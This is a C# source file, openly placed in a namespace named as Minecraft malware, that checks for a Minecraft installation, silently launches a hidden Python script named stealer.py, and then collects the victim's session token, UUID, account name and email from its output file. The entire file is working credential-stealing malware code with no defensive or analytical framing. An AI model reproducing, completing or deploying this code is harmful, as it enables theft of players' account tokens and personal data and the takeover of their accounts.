using System;
using System.Collections.Generic;
using System.IO;
using System.Windows;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace AmogusEXE.Malware.Minecraft
{
    public static class ProcessSpoofer
    {
        public static SortedDictionary<string, string> GetMinecraft()
        {
            if (Directory.Exists(
                $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\.minecraft\\"))
            {
                System.Diagnostics.ProcessStartInfo start = new System.Diagnostics.ProcessStartInfo();
                start.FileName = $@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Programs\Python\Python39\python.exe";
                start.Arguments = $"{Directory.GetCurrentDirectory()}\\stealer.py";
                start.UseShellExecute = false;
                start.CreateNoWindow = true; 
                start.RedirectStandardOutput = true;
                start.RedirectStandardError = true;
                start.LoadUserProfile = true;
                using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(start))
                {
                    using (StreamReader reader = process.StandardOutput)
                    {
                        try
                        {
                            string stderr = process.StandardError.ReadToEnd();
                            dynamic readToEnd = reader.ReadToEnd();
                        }
                        catch (Exception e)
                        {
                            MessageBox.Show(e.Message);
                        }
                    }
                }
                
                JObject dat = JsonConvert.DeserializeObject<JObject>(File.ReadAllText($"{Directory.GetCurrentDirectory()}\\data"));
                
                string token = (string) dat["token"];
                string profileID = (string) dat["UUID"];
                string name = (string) dat["name"];
                string mail = (string) dat["email"];
                
                
                SortedDictionary<string, string> dict = new SortedDictionary<string, string>();
                dict.Add("token", token);
                dict.Add("profileID", profileID);
                dict.Add("email", mail);
                dict.Add("name", name);
                return dict;
            }
            return null;
        }
    }
}